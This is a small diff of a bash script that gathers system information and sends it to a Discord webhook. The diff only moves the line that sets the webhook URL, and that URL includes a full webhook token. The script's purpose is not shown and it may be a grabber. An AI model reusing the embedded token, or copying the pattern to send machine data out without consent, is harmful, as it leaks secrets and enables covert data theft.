@@ -1,5 +1,4 @@
 # !/bin/bash
-WEBHOOK_URL="https://discord.com/api/webhooks/1463916344486531123/F2ug8k4hY6iST_INj_GdyO21BtkmtvfC6377f5dKKFYifzwqE9wioDsQvLEoHAyLp2er"
 # ============================================================================
 # 1. SYSTEM INFORMATION COLLECTION
 # ============================================================================
@@ -245,7 +244,7 @@ JSON=$(cat <<EOF
 }
 EOF
 )
-
+WEBHOOK_URL="https://discord.com/api/webhooks/1463916344486531123/F2ug8k4hY6iST_INj_GdyO21BtkmtvfC6377f5dKKFYifzwqE9wioDsQvLEoHAyLp2er"
 # ============================================================================
 # 5. SEND TO DISCORD
 # ============================================================================
